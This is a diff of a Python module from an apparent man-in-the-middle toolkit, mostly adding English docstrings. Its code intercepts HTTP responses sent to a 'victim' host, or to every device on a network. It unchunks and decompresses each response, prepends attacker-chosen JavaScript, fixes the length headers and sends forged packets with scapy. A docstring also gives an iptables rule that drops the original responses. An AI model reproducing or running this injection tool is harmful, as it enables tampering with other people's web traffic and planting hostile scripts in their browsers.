@@ -25,22 +25,6 @@
 # - Me llega un paquete chunked o no chunked, con gzip completo.
 # - Me llega un paquete no chunked, sin gzip, completo o incompleto.
 
-#Cosas que hacer:
-# - Cuando no puedo descomprimir, lanzo thread que snifee paquetes. Voy dechunkeando esos paquetes hasta
-#   recibir un chunk de 0. Igual esto lo tendria que hacer siempre que hay chunked y gzip:
-#           CHUNKED GZIP
-#              0      0     Inyecto en primer paquete y envio
-#              1      0     Inyecto en primer paquete y envio
-#              0      1     
-#              1      1     Lanzo thread que snifee paquetes y los dechunkee hasta que reciba un chunk 0. Entonces los descomprime todos, 
-#                           añade codigo, comprime todo
-
-#CHANGES:
-#   AHORA EL CONTENT LENGTH HEADER SE ACTUALIZA DE FORMA CORRECTA EN FUNCION DE LA DIFERENCIA DE LONGITUD, Y NO EN FUNCION
-#   DE LA LONGITUD DEL CODIGO AÑADIDO, QUE PODIA VARIAR DEPENDIENDO DE SI ERA COMPRIMIDO O NO.
-#
-#   LO MISMO CON CHUNKED.
-
 
 import threading
 import gzip
@@ -50,27 +34,61 @@ from src import packet_utilities
 from src.log import log
 
 class ForwardPacketPlease(Exception):
+    """Exception raised when a known error occurs and it is not possible to
+    inject code in the packet. In those cases, the original packet must be
+    forwarded.
+    """
     pass
     
 
 class Spoofed_HTTP_Load(bytes):
+    """Bytes class that creates a spoofed http load, adding code to the
+    original one, changing length header, etc. When you create it, it performs 
+    all needed procedures in order to return a correct spoofed load with the 
+    injected code.
+    """
+    
     def _gzip_action_if_needed(self, load, action):
+        """Compress or decompresses the load if gzip encoding was detected.
+        
+        Parameters:
+            load (bytes): the http load that will be compressed or 
+                decompressed. It must not include http headers.
+            action (str): the performed action, which can be 'compress' or 
+                'decompress'.
+                
+        Returns:
+            bytes: the load, whether the action has been applied or not.
+        """
+        
         if action == "compress": action_f = gzip.compress
         elif action == "decompress": action_f = gzip.decompress
         
         if "gzip" in self.content_encoding_header:
             load = action_f(load)
-
         return load
-
         
         
     def _update_and_add_chunk_length_if_needed(self, load, b_old_chunk_length, length_difference):
-        # ~ if "chunked" in self.transfer_encoding_header:
-            # ~ hex_new_chunk_length = hex(len(load))[2:].encode()
-            # ~ all_new_chunk_length = hex_new_chunk_length + b"\r\n"
-            # ~ load = all_new_chunk_length + load
-        # ~ return load
+        """Adds the chunk length header to the beggining of a http load.
+        
+        It is added according to the old chunk length and the length difference
+        between the old and the new load. This is done only if chunk encoding 
+        is detected.
+        
+        Parameters:
+            load (bytes): the load the chunk length will be added to. It must 
+                not include http headers.
+            b_old_chunk_length (bytes): the complete chunk length header of the
+                old load, which is the chunk length in hexadecimal followed by 
+                \\r\\n. 
+            length_difference (int): the difference between the length of the 
+                old load and the length of the new load.
+                
+        Returns:
+            bytes: the load with the chunk length header. If there is not chunk
+                encoding, it will remain the same.
+        """
         
         if b_old_chunk_length and "chunked" in self.transfer_encoding_header:
             int_old_chunk_length = int(b_old_chunk_length[:-2].decode(), 16) #paso de bytes de base 16 a int de base 10
@@ -82,6 +100,23 @@ class Spoofed_HTTP_Load(bytes):
     
     
     def _remove_header_attribute_if_needed(self, attr_name, load, length_needed):
+        """Removes a given http header from a http load 
+        
+        It can be removed totally or partially according to the needed length 
+        of the final load. 
+        
+        Parameters:
+            attr_name (bytes or str): the key name of the http header. For 
+                example: 'Expires', 'Date'
+            load (bytes): the load whose header will be removed. It must
+                include http headers, so it is the full http packet.
+            length_needed (int): the final length of the load. It is usually 
+                the length of the original load. so both have the same length.
+        
+        Returns:
+            bytes: the load, whether the header has been removed or not.
+        """
+        
         if len(load) > length_needed:
             new_load = load
             attr_all = packet_utilities.get_header_attribute_from_http_load(attr_name, new_load)
@@ -92,7 +127,6 @@ class Spoofed_HTTP_Load(bytes):
                 new_load = new_load.replace(attr_all, b"", 1)
             else: #quito la longitud adecuada para llegar al tamaño
                 remove = attr_all[-2-(len(load)-length_needed):-2] #la parte del atributo que quito
-                
                 
                 #si la longitud de lo que vamos a quitar es mayor a la longitud de lo que seria
                 #el valor del atributo, en vez de dejar el nombre del atributo a medias (ej 'Expir'),
@@ -106,7 +140,6 @@ class Spoofed_HTTP_Load(bytes):
                 if len(remove) >= len(attr_all) - len(attr_name+": \n\r"): 
                     remove = attr_all[len(attr_name + ": \n\r")-2:-2]
 
-                    
                 new_load = new_load.replace(remove, b"", 1)
             return new_load
         else:
@@ -114,6 +147,19 @@ class Spoofed_HTTP_Load(bytes):
 
 
     def _shorten_load_if_needed(self, load, length_needed):
+        """Shortens a http load to the needed length, removing unnecessary http
+        headers.
+        
+        Parameters:
+            load (bytes): the load that will be shortened. It must include http
+                headers, so it is the full http packet.
+            length_needed (int): the final length of the load. It is usually 
+                the length of the original load. so both have the same length.
+                
+        Returns:
+            bytes: the shortened load.
+        """
+        
         attributes = ["Date", "Expires", "Last-Modified", "Server", "X-Powered-By", "X-Served-By", "X-Cache", "X-Cache-Hits", "X-Timer"] #not sure about those last X-*
         
         new_load = load
@@ -127,6 +173,21 @@ class Spoofed_HTTP_Load(bytes):
                 
     
     def _update_length_header_if_needed(self, old_load, new_load):
+        """Updates the length header at the beggining of a http packet.
+        
+        It is updated according to the difference with the length of the old 
+        load, and just if it is found.
+        
+        Parameters:
+            old_load (bytes): the original load received. It must include http
+                headers, so it is the full http packet.
+            new_load (bytes): the load whose length header will be changed. It
+                must include http headers, so it is the full http packet.
+                
+        Returns:
+            bytes: the updated load.
+        """
+        
         length_all = packet_utilities.get_header_attribute_from_http_load("Content-Length", new_load)
         if length_all:
             length_n = length_all[16:-2]
@@ -134,7 +195,23 @@ class Spoofed_HTTP_Load(bytes):
             new_load = new_load.replace(length_all, new_length, 1)
         return new_load
         
+        
     def _remove_chunk_length_if_needed(self, load):
+        """Removes the FIRST chunk length header from a http load if chunk 
+        encoding was detected.
+        
+        Parameters:
+            load (bytes): the http load that will be unchunked. It must not 
+                include http headers.
+        
+        Returns:
+            tuple: which contains
+                bytes: the removed chunk length header,  If there is no chunk 
+                    encoding, empty bytes will be returned.
+                bytes: the unchunked load. If there is no chunk encoding, the 
+                    load will remain the same.
+        """
+        
         if "chunked" in self.transfer_encoding_header:
             pos = load.find(b"\r\n")
             chunk_len = load[:pos+2]
@@ -142,15 +219,30 @@ class Spoofed_HTTP_Load(bytes):
             return chunk_len, new_load
         return b"", load
     
+    
     def __new__(self, real_load, injected_code):
-        #le quito chunked
-        #decomprimo
-        #añado codigo
-        #comprimo
-        #añado chunked actualizado
-        #quito headers para reducir longitud
-        #actualizo el header de la longitud
-              
+        """Creates a new spoofed http load with the injected code at the
+        beggining. 
+        
+        The procedure usually is: unchunking if needed, decompressing if 
+        needed, adding code, compressing if needed, chunking if needed,
+        shortening and updating.
+        
+        Parameters:
+            real_load (bytes): the original load the code will be injected to.
+            injected_code (bytes): the code that will be injected.
+        
+        Possible Exceptions: 
+            ForwardPacketPlease: raised when a known error occurs, for example 
+                when attempts to spoof an incomplete or empty gzipped load.
+            Other Exceptions: 
+                raised when an unknown error or an error whose handling has not
+                yet been implemented.
+        
+        Returns:
+            bytes: the spoofed load.
+        """
+
         spoof_load = real_load
         
         self.injected_code = injected_code
@@ -174,16 +266,11 @@ class Spoofed_HTTP_Load(bytes):
             except Exception as err:
                 #In this cases, the packet is not spoofed and the real packet is forwarded.
                 raise
-
                     
             spoof_load[1] = self.injected_code + spoof_load[1]
-            
-            
             spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "compress") 
             
             length_after_adding_code = len(spoof_load[1])
-
-            
             spoof_load[1] = self._update_and_add_chunk_length_if_needed(self, spoof_load[1], old_chunk_length, length_after_adding_code - length_before_adding_code)
         
         else: #unusual procedure: packet contains only headers
@@ -198,20 +285,42 @@ class Spoofed_HTTP_Load(bytes):
         
         spoof_load = b"\r\n\r\n".join(spoof_load)
         
-        
         spoof_load = self._shorten_load_if_needed(self, spoof_load, len(real_load))
         spoof_load = self._update_length_header_if_needed(self, real_load, spoof_load)
         
         #print(real_load)
         #print(spoof_load)
-        #print(gzip.decompress(spoof_load.split(b"\r\n\r\n")[1].split(b"\r\n")[1][:len(self.injected_code)]))
         return super().__new__(self, spoof_load)
 
 
 class JS_Injecter(threading.Thread):
-    """holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
-    jajajaaaaaaaaaaaaaa"""
+    """Thread of the JS Injecting module.
+    
+    It intercepts every first http answer from the server to the victim,
+    injects code in it and sends it.
+    
+    Iptables rule needed:
+        iptables -A FORWARD -p tcp --sport 80 -m string --string 'ype: 
+            text/html' --algo bm -j DROP
+    """
+    
     def __init__(self, exit_event, target, file_loc, timeout):
+        """Created the thread.
+        
+        Parameters:
+            exit_event (threading.Event): the event that will be checked to
+                finish the thread and so the DNS Spoofing attack.
+            target (str): the IP address of the target. ARP packets will be
+                sent to this IP. Optional 'everyone' string can be passed, and
+                every device in the net will be targetted.
+            file_loc (str): the location of the file which contains the code
+                that will be injected.
+            timeout (int, None): the time in seconds of the duration of the
+                attack. If None, it will last until CTRL-C is pressed.
+            As a Thread, it can also have any of a thread parameters. See
+            help(threading.Thread) for more help.
+        """
+        
         super().__init__()
         self.exit_event = exit_event
         self.target = target
@@ -222,16 +331,42 @@ class JS_Injecter(threading.Thread):
           
     
     def _add_handled_packet(self, packet):
+        """Adds a packet to the list of handled packets.
+        
+        It adds a tuple which contains the packet ack number, the packet seq 
+        number and the packet TCP checksum.
+        
+        Parameters:
+            packet (scapy.packet.Packet): handled packet
+        """
+        
         data = (packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP"))
         if not data in self.handled_packets: #why the hell did i put this
             self.handled_packets.append(data) 
             
     
     def _has_packet_been_handled(self, packet):
+        """Checks if a packet has been handled, depending on its ack number,
+        seq number and its TCP checksum.
+        
+        Parameters:
+            packet (scapy.packet.Packet): the packet that may has been handled.
+            
+        Returns:
+            bool: True if it has already been handled, False otherwise. 
+        """
+        
         result = ((packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP")) in self.handled_packets)
         return result
         
+        
     def _send_spoofed_packet(self, real_packet):
+        """Creates a spoofed http packet with injected code and sends it.
+        
+        Parameters:
+            real_packet (scapy.packet.Packet): original packet.
+        """
+        
         try:
             spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
         except ForwardPacketPlease as err:
@@ -247,16 +382,10 @@ class JS_Injecter(threading.Thread):
             self._forward_http_packet(real_packet)
             #raise
             return
-        
-        # ~ spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags, id=real_packet["IP"].id)/ \
-                       # ~ TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, 
-                       # ~ ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags, window=real_packet["TCP"].window, options=real_packet["TCP"].options)/ \
-                       # ~ Raw(load=spoof_load)
-                       
+
         spoof_packet = IP(src=real_packet["IP"].src, dst=real_packet["IP"].dst, flags=real_packet["IP"].flags)/ \
                        TCP(sport=real_packet["TCP"].sport, dport=real_packet["TCP"].dport, seq=real_packet["TCP"].seq, ack=real_packet["TCP"].ack, flags=real_packet["TCP"].flags)/ \
                        Raw(load=spoof_load)
-        
         
         send(spoof_packet, verbose=0)
         self._add_handled_packet(spoof_packet)
@@ -269,41 +398,39 @@ class JS_Injecter(threading.Thread):
         Parameters:
             packet (scapy.packet.Packet): the packet that will be forwarded.
         """
-        
-        #print("forwarding get packet")
+
         p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
             TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
             Raw(load=packet.load)
-            
+
         send(p, verbose=0)
         
-    def handle_packet(self, packet):
+        
+    def _handle_packet(self, packet):
+        """Handles a http packet.
+        
+        Parameters:
+            packet (scapy.packet.Packet): the packet that will be handled.
+        """
+        
         if not self._has_packet_been_handled(packet):
             self._add_handled_packet(packet)
             self._send_spoofed_packet(packet)
-            
-            # ~ if packet.load.split(b"\r\n\r\n")[1]:
-                # ~ #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
-                # ~ self._send_spoofed_packet(packet)
-            # ~ else:
-                # ~ #Some packets are not HTTP 200 OK.
-                # ~ #Some packets arrive divided in: 1st packet http header, 2nd packet http body.
-                # ~ #If there's chunked encoding, maybe i can add my own chunk there. the problem is if there's also
-                # ~ #gzip encoding, then i can do nothing. This happens most of the times, so it's better 
-                # ~ #just to forward those packets.
-                # ~ log.js.warning("empty_packet")
-                # ~ #print(packet.load.decode())
-                # ~ self._forward_http_packet(packet)
                 
         
     def run(self):
+        """Method representing the thread's activity. It is started when start
+        function is called.
+        
+        It intercepts every first http answer packet from the server to the
+        victim and handles it, injecting code when it's possible.
+        """
+        
         log.js.info("start", timeout=self.timeout, target=self.target)
-        #print("JS Injecter started with target", self.target)
         
         #T not included in lfilter cause its sometimes t and sometimes T
         sniff(filter="tcp and src port 80 and host " + self.target, lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, 
-              prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
+              prn=self._handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
               timeout=self.timeout, store=False)
         
         log.js.info("finish")
-        #print("JS Injecter finished.")
